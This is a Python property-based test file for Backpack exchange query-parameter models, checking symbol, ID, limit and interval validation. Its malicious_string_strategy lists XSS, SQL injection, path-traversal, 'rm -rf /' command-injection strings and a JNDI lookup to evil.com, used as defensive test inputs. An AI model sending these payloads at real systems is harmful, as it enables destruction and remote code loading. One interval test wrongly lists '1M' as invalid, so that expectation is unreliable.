"""Property-based tests for Backpack raw query parameter models.

This module provides comprehensive property-based testing of Backpack query parameter models,
which are critical for API request validation and security boundary enforcement.

SECURITY CRITICAL: Query parameter validation must prevent:
- Parameter injection attacks through malformed query strings
- Buffer overflow attempts through oversized parameter values
- Type confusion attacks through unexpected parameter types
- Unicode encoding attacks through malformed text
- API endpoint abuse through invalid parameter combinations

Key Testing Areas:
- Symbol validation across all endpoints with comprehensive character sets
- Timestamp parameter validation with edge cases and overflow scenarios
- Limit parameter validation with boundary conditions
- Optional parameter handling with null/empty values
- Field alias support and backward compatibility
- Immutability properties and frozen model enforcement
- String length validation with Unicode considerations

Following TESTING_SECURITY_RULES.md:
- NO hardcoded parameter values (Hypothesis generates them)
- NO fallback mechanisms that could hide validation errors
- Comprehensive testing of parameter boundary conditions
- Validation of security-sensitive input handling

Architecture Compliance:
- Follows RULE-ARCH-MODEL-DESIGN-V2 for query parameter model design
- Implements RULE-RUNTIME-SAFETY-V4 for safe parameter processing
- Adheres to RULE-NO-SILENCING-V4 for proper validation error propagation
"""

from __future__ import annotations

import contextlib
from datetime import timedelta
from typing import Any, Literal, cast

import pytest
from hypothesis import assume, given, settings, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import BaseModel, ValidationError

from cyberdelta.apis.backpack.models.bp_raw_query_params import (
    BackpackRawGetAccountInfoParams,
    BackpackRawGetBalancesParams,
    BackpackRawGetHistoricalFundingRatesParams,
    BackpackRawGetMarketDataParams,
    BackpackRawGetMarketsParams,
    BackpackRawGetOrderBookParams,
    BackpackRawGetOrderHistoryParams,
    BackpackRawGetPositionsParams,
    BackpackRawGetTickerParams,
    BackpackRawGetTradeHistoryParams,
)
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError
from tests.common_symbols import BTC_USDC_BP, ETH_USDC_BP


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================


def _create_symbol_with_dash(base: str, quote: str) -> str:
    """Create symbol with dash separator.

    Args:
        base: Base currency string
        quote: Quote currency string

    Returns:
        Symbol with dash separator
    """
    return f"{base}-{quote}"


def _create_symbol_with_underscore(base: str, quote: str) -> str:
    """Create symbol with underscore separator.

    Args:
        base: Base currency string
        quote: Quote currency string

    Returns:
        Symbol with underscore separator
    """
    return f"{base}_{quote}"


def _create_order_id(x: int) -> str:
    """Create order ID with prefix.

    Args:
        x: Integer identifier

    Returns:
        Order ID string
    """
    return f"order_{x}"


def _create_trade_id(x: int) -> str:
    """Create trade ID with prefix.

    Args:
        x: Integer identifier

    Returns:
        Trade ID string
    """
    return f"trade_{x}"


def _create_client_id(x: str) -> str:
    """Create client ID with prefix.

    Args:
        x: Hex string identifier

    Returns:
        Client ID string
    """
    return f"client_{x}"


# =============================================================================
# HYPOTHESIS STRATEGIES FOR QUERY PARAMETER TESTING
# =============================================================================


def valid_symbol_strategy() -> SearchStrategy[str]:
    """Generate valid trading symbol strings.

    Returns:
        A Hypothesis strategy for valid trading symbols.
    """
    return st.one_of([
        # Common symbols
        st.sampled_from([
            "BTC-USDC",
            "ETH-USDC",
            "SOL-USDC",
            "DOGE-USDC",
            "BTC_USDC",
            "ETH_USDT",
            "SOL_USDT",
            "MATIC_USDC",
            "AVAX-USDC",
            "ADA-USDC",
            "DOT-USDC",
            "LINK-USDC",
        ]),
        # Generated valid symbols
        st.builds(
            _create_symbol_with_dash,
            st.text(min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu"])),
            st.sampled_from(["USDC", "USDT", "USD", "BTC", "ETH"]),
        ),
        st.builds(
            _create_symbol_with_underscore,
            st.text(min_size=2, max_size=10, alphabet=st.characters(whitelist_categories=["Lu"])),
            st.sampled_from(["USDC", "USDT", "USD", "BTC", "ETH"]),
        ),
        # Valid symbol format within length limits
        st.text(
            min_size=3,
            max_size=64,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_."
            ),
        ).filter(lambda x: len(x.encode("utf-8")) <= 64),
    ])


def invalid_symbol_strategy() -> SearchStrategy[str]:
    """Generate invalid trading symbol strings.

    Returns:
        A Hypothesis strategy for invalid trading symbols.
    """
    return st.one_of([
        # Empty and whitespace
        st.just(""),
        st.just("   "),
        st.just("\t\n"),
        # Too long
        st.text(min_size=65, max_size=200),
        st.just("A" * 65),
        # Unicode that might cause issues
        st.text(min_size=1, max_size=100).filter(
            lambda x: len(x.encode("utf-8")) > 64 or not x.strip()
        ),
    ])


def timestamp_strategy() -> SearchStrategy[int]:
    """Generate timestamp values for testing.

    Returns:
        A Hypothesis strategy for timestamp values.
    """
    return st.one_of([
        # Common timestamp ranges
        st.integers(min_value=0, max_value=2147483647),  # 32-bit timestamps
        st.integers(min_value=1000000000, max_value=2000000000),  # Realistic range
        st.integers(min_value=1678886400000, max_value=1678972800000),  # Millisecond timestamps
        # Edge cases
        st.just(0),
        st.just(1),
        st.just(-1),
        st.integers(min_value=-2147483648, max_value=-1),  # Negative timestamps
    ])


def limit_strategy() -> SearchStrategy[int]:
    """Generate limit values for testing.

    Returns:
        A Hypothesis strategy for limit values.
    """
    return st.one_of([
        # Valid limits
        st.integers(min_value=0, max_value=10000),
        st.sampled_from([0, 1, 10, 50, 100, 500, 1000]),
        # Edge cases
        st.just(0),
        st.just(1),
    ])


def invalid_limit_strategy() -> SearchStrategy[int]:
    """Generate invalid limit values for testing.

    Returns:
        A Hypothesis strategy for invalid limit values.
    """
    return st.integers(min_value=-1000, max_value=-1)


def interval_strategy() -> SearchStrategy[
    Literal[
        "1m", "3m", "5m", "15m", "30m", "1h", "2h", "4h", "6h", "8h", "12h", "1d", "3d", "1w", "1M"
    ]
]:
    """Generate valid interval strings for market data.

    Returns:
        A Hypothesis strategy for valid intervals.
    """
    return st.sampled_from([
        "1m",
        "3m",
        "5m",
        "15m",
        "30m",
        "1h",
        "2h",
        "4h",
        "6h",
        "8h",
        "12h",
        "1d",
        "3d",
        "1w",
        "1M",
    ])


def invalid_interval_strategy() -> SearchStrategy[str]:
    """Generate invalid interval strings.

    Returns:
        A Hypothesis strategy for invalid intervals.
    """
    return st.one_of([
        st.just("invalid"),
        st.just("2m"),  # Not in allowed list
        st.just("24h"),  # Not in allowed list
        st.just("1M"),  # Wrong case
        st.text(min_size=1, max_size=20).filter(
            lambda x: x
            not in [
                "1m",
                "3m",
                "5m",
                "15m",
                "30m",
                "1h",
                "2h",
                "4h",
                "6h",
                "8h",
                "12h",
                "1d",
                "3d",
                "1w",
            ]
        ),
    ])


def id_string_strategy() -> SearchStrategy[str]:
    """Generate ID strings for orders, trades, etc.

    Returns:
        A Hypothesis strategy for ID strings.
    """
    return st.one_of([
        # Common ID formats
        st.text(
            min_size=1, max_size=64, alphabet=st.characters(whitelist_categories=["Lu", "Ll", "Nd"])
        ),
        st.builds(_create_order_id, st.integers(min_value=1, max_value=999999)),
        st.builds(_create_trade_id, st.integers(min_value=1, max_value=999999)),
        st.builds(_create_client_id, st.text(min_size=1, max_size=20, alphabet="abcdef0123456789")),
        # UUID-like strings
        st.fixed_dictionaries({
            0: st.text(alphabet="0123456789abcdef", min_size=8, max_size=8),
            1: st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            2: st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            3: st.text(alphabet="0123456789abcdef", min_size=4, max_size=4),
            4: st.text(alphabet="0123456789abcdef", min_size=12, max_size=12),
        })
        .map(lambda d: [d[0], d[1], d[2], d[3], d[4]])
        .map("-".join),
    ])


def malicious_string_strategy() -> SearchStrategy[Any]:
    """Generate malicious strings for security testing.

    Returns:
        A Hypothesis strategy for malicious inputs.
    """
    return st.one_of([
        # XSS attempts
        st.just("<script>alert('xss')</script>"),
        st.just("<img src=x onerror=alert(1)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE users;--"),
        st.just("1' OR '1'='1"),
        # Path traversal
        st.just("../../../etc/passwd"),
        st.just("..\\..\\..\\windows\\system32\\config\\sam"),
        # Command injection
        st.just("; rm -rf /"),
        st.just("$(rm -rf /)"),
        st.just("`rm -rf /`"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("A" * 1500),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%s"),
        st.just("${jndi:ldap://evil.com/a}"),
        # JSON injection
        st.just('{"malicious": "payload"}'),
        st.just("\\x22malicious\\x22"),
    ])


# =============================================================================
# PROPERTY TESTS FOR TICKER PARAMS
# =============================================================================


class TestBackpackRawGetTickerParamsProperties:
    """Property-based tests for BackpackRawGetTickerParams."""

    @given(symbol=valid_symbol_strategy())
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_symbol_acceptance(self, symbol: str) -> None:
        """Property: Valid symbols should always be accepted."""
        params = BackpackRawGetTickerParams(symbol=symbol)

        # Property: Symbol should be preserved exactly
        assert params.symbol == symbol

        # Property: Model should be immutable
        assert params.model_config.get("frozen") is True

    @given(invalid_symbol=invalid_symbol_strategy())
    @settings(max_examples=150, deadline=timedelta(seconds=1))
    def test_invalid_symbol_rejection(self, invalid_symbol: str) -> None:
        """Property: Invalid symbols should always be rejected."""
        if not invalid_symbol.strip():
            # Empty strings should raise EmptyStringError
            with pytest.raises(EmptyStringError):
                BackpackRawGetTickerParams(symbol=invalid_symbol)
        elif len(invalid_symbol.encode("utf-8")) > 64:
            # Oversized strings should raise TypeFieldError
            with pytest.raises(TypeFieldError):
                BackpackRawGetTickerParams(symbol=invalid_symbol)
        else:
            # Other validation errors
            with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
                BackpackRawGetTickerParams(symbol=invalid_symbol)

    @given(
        symbol=valid_symbol_strategy(),
        extra_field_name=st.text(min_size=1, max_size=20).filter(lambda x: x != "symbol"),
        extra_field_value=st.one_of([st.text(), st.integers(), st.booleans(), st.none()]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_extra_fields_rejection(
        self, symbol: str, extra_field_name: str, extra_field_value: str | int | bool | None
    ) -> None:
        """Property: Extra fields should always be rejected."""
        data = {"symbol": symbol, extra_field_name: extra_field_value}

        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            BackpackRawGetTickerParams.model_validate(data)

    @given(symbol=valid_symbol_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_immutability_enforcement(self, symbol: str) -> None:
        """Property: Params should be immutable after creation."""
        params = BackpackRawGetTickerParams(symbol=symbol)

        with pytest.raises(ValidationError, match="Instance is frozen"):
            params.symbol = "new_symbol"

    @given(malicious_symbol=malicious_string_strategy())
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_malicious_symbol_resistance(self, malicious_symbol: object) -> None:
        """Property: Malicious symbol inputs should be safely rejected."""
        # Convert to string if needed
        if not isinstance(malicious_symbol, str):
            malicious_symbol = str(malicious_symbol)

        # Should either accept as valid string or reject with appropriate error
        try:
            params = BackpackRawGetTickerParams(symbol=malicious_symbol)
            # If accepted, should be preserved as-is (no interpretation/execution)
            assert params.symbol == malicious_symbol
        except (ValidationError, EmptyStringError, TypeFieldError):
            # Rejection is acceptable for invalid inputs
            pass


# =============================================================================
# PROPERTY TESTS FOR ORDER BOOK PARAMS
# =============================================================================


class TestBackpackRawGetOrderBookParamsProperties:
    """Property-based tests for BackpackRawGetOrderBookParams."""

    @given(
        symbol=valid_symbol_strategy(),
        limit=st.one_of([st.none(), limit_strategy()]),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_params_acceptance(self, symbol: str, limit: int | None) -> None:
        """Property: Valid parameters should always be accepted."""
        params = BackpackRawGetOrderBookParams(symbol=symbol, limit=limit)

        # Property: Values should be preserved
        assert params.symbol == symbol
        assert params.limit == limit

    @given(
        symbol=valid_symbol_strategy(),
        invalid_limit=invalid_limit_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_negative_limit_rejection(self, symbol: str, invalid_limit: int) -> None:
        """Property: Negative limits should be rejected."""
        assume(invalid_limit < 0)

        with pytest.raises(ValidationError, match="Must be >= 0"):
            BackpackRawGetOrderBookParams(symbol=symbol, limit=invalid_limit)

    @given(
        symbol=valid_symbol_strategy(),
        wrong_type_limit=st.one_of([st.text(), st.booleans(), st.lists(st.integers())]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_limit_type_validation(self, symbol: str, wrong_type_limit: object) -> None:
        """Property: Non-integer limits should be rejected."""
        data = {"symbol": symbol, "limit": wrong_type_limit}

        with pytest.raises(ValidationError):
            BackpackRawGetOrderBookParams.model_validate(data)


# =============================================================================
# PROPERTY TESTS FOR HISTORICAL FUNDING RATES PARAMS
# =============================================================================


class TestBackpackRawGetHistoricalFundingRatesParamsProperties:
    """Property-based tests for BackpackRawGetHistoricalFundingRatesParams."""

    @given(
        symbol=valid_symbol_strategy(),
        start_time=st.one_of([st.none(), timestamp_strategy()]),
        end_time=st.one_of([st.none(), timestamp_strategy()]),
        limit=st.one_of([st.none(), limit_strategy()]),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_params_acceptance(
        self, symbol: str, start_time: int | None, end_time: int | None, limit: int | None
    ) -> None:
        """Property: Valid parameters should always be accepted."""
        params = BackpackRawGetHistoricalFundingRatesParams(
            symbol=symbol,
            startTime=start_time,
            endTime=end_time,
            limit=limit,
        )

        # Property: Values should be preserved
        assert params.symbol == symbol
        assert params.startTime == start_time
        assert params.endTime == end_time
        assert params.limit == limit

    @given(
        symbol=valid_symbol_strategy(),
        negative_timestamp=st.integers(min_value=-2147483648, max_value=-1),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_negative_timestamps_allowed(self, symbol: str, negative_timestamp: int) -> None:
        """Property: Negative timestamps should be allowed for historical data."""
        params = BackpackRawGetHistoricalFundingRatesParams(
            symbol=symbol,
            startTime=negative_timestamp,
            endTime=negative_timestamp,
        )

        assert params.startTime == negative_timestamp
        assert params.endTime == negative_timestamp

    @given(
        symbol=valid_symbol_strategy(),
        invalid_limit=invalid_limit_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_negative_limit_rejection(self, symbol: str, invalid_limit: int) -> None:
        """Property: Negative limits should be rejected."""
        assume(invalid_limit < 0)

        with pytest.raises(ValidationError, match="Must be >= 0"):
            BackpackRawGetHistoricalFundingRatesParams(symbol=symbol, limit=invalid_limit)


# =============================================================================
# PROPERTY TESTS FOR ORDER HISTORY PARAMS
# =============================================================================


class TestBackpackRawGetOrderHistoryParamsProperties:
    """Property-based tests for BackpackRawGetOrderHistoryParams."""

    @given(
        symbol=st.one_of([st.none(), valid_symbol_strategy()]),
        order_id=st.one_of([st.none(), id_string_strategy()]),
        client_id=st.one_of([st.none(), id_string_strategy()]),
        limit=st.one_of([st.none(), limit_strategy()]),
        start_time=st.one_of([st.none(), timestamp_strategy()]),
        end_time=st.one_of([st.none(), timestamp_strategy()]),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_params_acceptance(
        self,
        symbol: str | None,
        order_id: str | None,
        client_id: str | None,
        limit: int | None,
        start_time: int | None,
        end_time: int | None,
    ) -> None:
        """Property: Valid parameters should always be accepted."""
        params_data = {
            "symbol": symbol,
            "orderId": order_id,
            "clientId": client_id,
            "limit": limit,
        }
        if start_time is not None:
            params_data["from"] = start_time
        if end_time is not None:
            params_data["to"] = end_time

        params = BackpackRawGetOrderHistoryParams.model_validate(params_data)

        # Property: Values should be preserved
        assert params.symbol == symbol
        assert params.orderId == order_id
        assert params.clientId == client_id
        assert params.limit == limit
        assert params.start_time == start_time
        assert params.end_time == end_time

    @given(
        symbol=valid_symbol_strategy(),
        start_time=timestamp_strategy(),
        end_time=timestamp_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_alias_support(self, symbol: str, start_time: int, end_time: int) -> None:
        """Property: Field aliases should work correctly."""
        data = {
            "symbol": symbol,
            "from": start_time,
            "to": end_time,
        }

        params = BackpackRawGetOrderHistoryParams.model_validate(data)
        assert params.start_time == start_time
        assert params.end_time == end_time

    @given(
        empty_string_field=st.sampled_from(["orderId", "clientId"]),
        empty_value=st.sampled_from(["", "   ", "\t\n"]),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_empty_string_rejection(self, empty_string_field: str, empty_value: str) -> None:
        """Property: Empty strings should be rejected for ID fields."""
        kwargs = {empty_string_field: empty_value}

        with pytest.raises(EmptyStringError):
            BackpackRawGetOrderHistoryParams.model_validate(kwargs)


# =============================================================================
# PROPERTY TESTS FOR MARKET DATA PARAMS
# =============================================================================


class TestBackpackRawGetMarketDataParamsProperties:
    """Property-based tests for BackpackRawGetMarketDataParams."""

    @given(
        symbol=valid_symbol_strategy(),
        interval=interval_strategy(),
        start_time=st.one_of([st.none(), timestamp_strategy()]),
        end_time=st.one_of([st.none(), timestamp_strategy()]),
        limit=st.one_of([st.none(), limit_strategy()]),
    )
    @settings(max_examples=200, deadline=timedelta(seconds=1))
    def test_valid_params_acceptance(
        self,
        symbol: str,
        interval: Literal[
            "1m",
            "3m",
            "5m",
            "15m",
            "30m",
            "1h",
            "2h",
            "4h",
            "6h",
            "8h",
            "12h",
            "1d",
            "3d",
            "1w",
            "1M",
        ],
        start_time: int | None,
        end_time: int | None,
        limit: int | None,
    ) -> None:
        """Property: Valid parameters should always be accepted."""
        params = BackpackRawGetMarketDataParams(
            symbol=symbol,
            interval=interval,
            startTime=start_time,
            endTime=end_time,
            limit=limit,
        )

        # Property: Values should be preserved
        assert params.symbol == symbol
        assert params.interval == interval
        assert params.startTime == start_time
        assert params.endTime == end_time
        assert params.limit == limit

    @given(
        symbol=valid_symbol_strategy(),
        invalid_interval=invalid_interval_strategy(),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_invalid_interval_rejection(self, symbol: str, invalid_interval: str) -> None:
        """Property: Invalid intervals should be rejected."""
        with pytest.raises(ValidationError, match="Input should be"):
            BackpackRawGetMarketDataParams.model_validate({
                "symbol": symbol,
                "interval": invalid_interval,
            })

    @given(missing_field=st.sampled_from(["symbol", "interval"]))
    @settings(max_examples=20, deadline=timedelta(seconds=1))
    def test_required_fields_validation(self, missing_field: str) -> None:
        """Property: Missing required fields should be rejected."""
        data = {"symbol": "BTC-USDC", "interval": "1h"}
        del data[missing_field]

        with pytest.raises(ValidationError, match="Field required"):
            BackpackRawGetMarketDataParams.model_validate(data)


# =============================================================================
# PROPERTY TESTS FOR EMPTY PARAMS MODELS
# =============================================================================


class TestEmptyParamsModelsProperties:
    """Property-based tests for models with no required fields."""

    @given(
        model_class=st.sampled_from([
            BackpackRawGetBalancesParams,
            BackpackRawGetPositionsParams,
            BackpackRawGetAccountInfoParams,
            BackpackRawGetMarketsParams,
        ])
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_empty_params_validity(self, model_class: type[BaseModel]) -> None:
        """Property: Empty parameter models should always be valid."""
        # Should work with no parameters
        params = model_class()
        assert params is not None

        # Should work with empty dict
        params_from_dict = model_class.model_validate({})
        assert params_from_dict is not None

        # Should be immutable
        assert params.model_config.get("frozen") is True

    @given(
        model_class=st.sampled_from([
            BackpackRawGetBalancesParams,
            BackpackRawGetPositionsParams,
            BackpackRawGetAccountInfoParams,
            BackpackRawGetMarketsParams,
        ]),
        extra_field_name=st.text(min_size=1, max_size=20),
        extra_field_value=st.one_of([st.text(), st.integers(), st.booleans()]),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_extra_fields_rejection_empty_models(
        self,
        model_class: type[BaseModel],
        extra_field_name: str,
        extra_field_value: str | int | bool | None,
    ) -> None:
        """Property: Extra fields should be rejected even for empty models."""
        data = {extra_field_name: extra_field_value}

        with pytest.raises(ValidationError, match="Extra inputs are not permitted"):
            model_class.model_validate(data)


# =============================================================================
# PROPERTY TESTS FOR GENERAL VALIDATION BEHAVIOR
# =============================================================================


class TestGeneralValidationBehaviorProperties:
    """Property-based tests for general validation behavior across all models."""

    @given(
        symbol=valid_symbol_strategy(),
        unicode_chars=st.text(min_size=1, max_size=20),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_unicode_symbol_handling(self, symbol: str, unicode_chars: str) -> None:
        """Property: Unicode characters in symbols should be handled appropriately."""
        # Combine symbol with unicode chars
        unicode_symbol = symbol + unicode_chars

        # Should either accept if within length limits or reject with appropriate error
        try:
            if len(unicode_symbol.encode("utf-8")) <= 64 and unicode_symbol.strip():
                params = BackpackRawGetTickerParams(symbol=unicode_symbol)
                assert params.symbol == unicode_symbol
            else:
                # Should be rejected for length or empty string
                with pytest.raises((TypeFieldError, EmptyStringError)):
                    BackpackRawGetTickerParams(symbol=unicode_symbol)
        except (TypeFieldError, EmptyStringError):
            # Expected for oversized or invalid input
            pass

    @given(
        symbol=valid_symbol_strategy(),
        control_chars=st.text(min_size=1, max_size=5, alphabet="\x00\x01\x02\x03\x1f"),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_control_characters_handling(self, symbol: str, control_chars: str) -> None:
        """Property: Control characters should be handled without causing issues."""
        control_symbol = symbol + control_chars

        # Should either accept (control chars are allowed) or reject for length
        try:
            if len(control_symbol.encode("utf-8")) <= 64:
                params = BackpackRawGetTickerParams(symbol=control_symbol)
                assert params.symbol == control_symbol
            else:
                with pytest.raises(TypeFieldError):
                    BackpackRawGetTickerParams(symbol=control_symbol)
        except TypeFieldError:
            # Expected for oversized input
            pass

    @given(
        model_data=st.dictionaries(
            st.text(min_size=1, max_size=20),
            st.one_of([st.text(), st.integers(), st.none()]),
            min_size=1,
            max_size=5,
        ),
        null_field=st.text(min_size=1, max_size=20),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_null_values_in_optional_fields(
        self, model_data: dict[str, Any], null_field: str
    ) -> None:
        """Property: Null values in optional fields should be handled correctly."""
        # Add a null value to test data
        model_data[null_field] = None

        # For models that might accept this data structure
        if "symbol" in model_data and "interval" in model_data:
            try:
                params = BackpackRawGetMarketDataParams.model_validate(model_data)
                # Null values should be preserved as None for optional fields
                assert getattr(params, null_field, "not_found") in [None, "not_found"]
            except (ValidationError, AttributeError):
                # Expected for invalid field names or validation failures
                pass

    @given(
        field_name=st.text(min_size=1, max_size=20),
        alias_name=st.text(min_size=1, max_size=20),
        value=timestamp_strategy(),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_populate_by_name_behavior(self, field_name: str, alias_name: str, value: int) -> None:
        """Property: populate_by_name should work for known aliases."""
        # Test known aliases
        if alias_name in ["from", "to"]:
            test_data: dict[str, Any] = {"symbol": "BTC-USDC"}
            test_data[alias_name] = value

            try:
                params = BackpackRawGetTradeHistoryParams.model_validate(test_data)
                if alias_name == "from":
                    assert params.start_time == value
                elif alias_name == "to":
                    assert params.end_time == value
            except ValidationError:
                # Expected for invalid combinations
                pass


# =============================================================================
# PROPERTY TESTS FOR SECURITY BOUNDARIES
# =============================================================================


class TestQueryParamsSecurityProperties:
    """Property-based tests for security-critical validation behavior."""

    @given(
        malicious_input=malicious_string_strategy(),
        field_name=st.sampled_from(["symbol", "orderId", "clientId", "fromId"]),
    )
    @settings(max_examples=100, deadline=timedelta(seconds=1))
    def test_malicious_input_resistance(self, malicious_input: object, field_name: str) -> None:
        """Property: Query parameter models should resist malicious inputs."""
        # Convert to string if needed
        if not isinstance(malicious_input, str):
            malicious_input = str(malicious_input)

        # Test with different models that accept the field
        test_models = []
        if field_name == "symbol":
            test_models = [BackpackRawGetTickerParams, BackpackRawGetOrderBookParams]
        elif field_name in ["orderId", "clientId"]:
            test_models = [BackpackRawGetOrderHistoryParams]
        elif field_name == "fromId":
            test_models = [BackpackRawGetTradeHistoryParams]

        for model_class in test_models:
            try:
                # Cast malicious input to Any to test model validation
                # This is intentional - we want to test how models handle wrong types
                kwargs = {field_name: cast(Any, malicious_input)}
                params = model_class(**kwargs)

                # If accepted, should be preserved as-is (no execution/interpretation)
                assert getattr(params, field_name) == malicious_input

                # Should not leak sensitive information
                param_str = str(params)
                assert "password" not in param_str.lower()
                assert "secret" not in param_str.lower()

            except (ValidationError, EmptyStringError, TypeFieldError):
                # Rejection is acceptable for invalid inputs
                pass

    @given(
        large_input=st.text(min_size=1000, max_size=1500),
        field_name=st.sampled_from(["symbol", "orderId", "clientId"]),
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_large_input_handling(self, large_input: str, field_name: str) -> None:
        """Property: Large inputs should be handled safely."""
        # Should reject oversized inputs with appropriate error
        if field_name == "symbol":
            with pytest.raises(TypeFieldError):
                BackpackRawGetTickerParams(symbol=large_input)
        elif field_name in ["orderId", "clientId"]:
            # These fields should also have reasonable limits
            kwargs = {field_name: large_input}
            with pytest.raises((TypeFieldError, ValidationError)):
                BackpackRawGetOrderHistoryParams.model_validate(kwargs)

    @given(
        deeply_nested_data=st.recursive(
            st.none() | st.booleans() | st.text(max_size=10),
            lambda children: st.lists(children, max_size=3)
            | st.dictionaries(st.text(max_size=5), children, max_size=3),
            max_leaves=10,
        ),
        field_name=st.text(min_size=1, max_size=10),
    )
    @settings(max_examples=20, deadline=timedelta(seconds=1))
    def test_deeply_nested_data_handling(self, deeply_nested_data: object, field_name: str) -> None:
        """Property: Deeply nested data should be handled safely."""
        data = {field_name: deeply_nested_data}

        # Should reject non-primitive types appropriately
        model_classes: list[type[BaseModel]] = [
            BackpackRawGetTickerParams,
            BackpackRawGetOrderBookParams,
        ]
        for model_class in model_classes:
            with contextlib.suppress(ValidationError, TypeError, RecursionError):
                model_class.model_validate(data)


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestQueryParamsIntegrationProperties:
    """Integration property tests for query parameter models."""

    @given(
        models_and_data=st.lists(
            st.tuples(
                st.sampled_from([
                    (BackpackRawGetTickerParams, {"symbol": "BTC-USDC"}),
                    (BackpackRawGetOrderBookParams, {"symbol": "ETH-USDC", "limit": 100}),
                    (BackpackRawGetMarketDataParams, {"symbol": "SOL-USDC", "interval": "1h"}),
                ]),
                st.dictionaries(
                    st.text(min_size=1, max_size=10),
                    st.one_of([st.text(max_size=20), st.integers(), st.none()]),
                    max_size=3,
                ),
            ),
            min_size=1,
            max_size=5,
        )
    )
    @settings(max_examples=50, deadline=timedelta(seconds=1))
    def test_batch_validation_consistency(
        self, models_and_data: list[tuple[tuple[type[BaseModel], dict[str, Any]], dict[str, Any]]]
    ) -> None:
        """Property: Batch validation should be consistent across multiple models."""
        results: list[tuple[type[BaseModel], BaseModel | None, bool]] = []

        for (model_class, base_data), extra_data in models_and_data:
            test_data = {**base_data, **extra_data}

            try:
                params = model_class.model_validate(test_data)
                results.append((model_class, params, True))
            except (ValidationError, TypeError):
                results.append((model_class, None, False))

        # Property: Validation behavior should be deterministic
        for (model_class, base_data), extra_data in models_and_data:
            test_data = {**base_data, **extra_data}

            # Re-validate with same data
            try:
                params_repeat = model_class.model_validate(test_data)
                # Should get same result
                original_result = next(r for r in results if r[0] == model_class)
                assert (params_repeat is not None) == original_result[2]
            except (ValidationError, TypeError):
                # Should fail consistently
                original_result = next(r for r in results if r[0] == model_class)
                assert original_result[2] is False


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_ticker_params_basic_functionality() -> None:
    """Test basic ticker params functionality for regression."""
    params = BackpackRawGetTickerParams(symbol=BTC_USDC_BP.value)
    assert params.symbol == BTC_USDC_BP.value


def test_order_book_params_with_limit() -> None:
    """Test order book params with limit for regression."""
    params = BackpackRawGetOrderBookParams(symbol=ETH_USDC_BP.value, limit=100)
    assert params.symbol == ETH_USDC_BP.value
    assert params.limit == 100


def test_market_data_params_all_intervals() -> None:
    """Test market data params with all valid intervals for regression."""
    valid_intervals = [
        "1m",
        "3m",
        "5m",
        "15m",
        "30m",
        "1h",
        "2h",
        "4h",
        "6h",
        "8h",
        "12h",
        "1d",
        "3d",
        "1w",
        "1M",
    ]

    for interval in valid_intervals:
        params = BackpackRawGetMarketDataParams(
            symbol="BTC-USDC",
            interval=cast(
                Literal[
                    "1m",
                    "3m",
                    "5m",
                    "15m",
                    "30m",
                    "1h",
                    "2h",
                    "4h",
                    "6h",
                    "8h",
                    "12h",
                    "1d",
                    "3d",
                    "1w",
                    "1M",
                ],
                interval,
            ),
        )
        assert params.interval == interval


def test_order_history_params_alias_support() -> None:
    """Test order history params alias support for regression."""
    data = {
        "symbol": "BTC-USDC",
        "from": 1678886400000,
        "to": 1678972800000,
    }
    params = BackpackRawGetOrderHistoryParams.model_validate(data)
    assert params.start_time == 1678886400000
    assert params.end_time == 1678972800000


def test_empty_params_models() -> None:
    """Test empty params models for regression."""
    assert BackpackRawGetBalancesParams() is not None
    assert BackpackRawGetPositionsParams() is not None
    assert BackpackRawGetAccountInfoParams() is not None
    assert BackpackRawGetMarketsParams() is not None
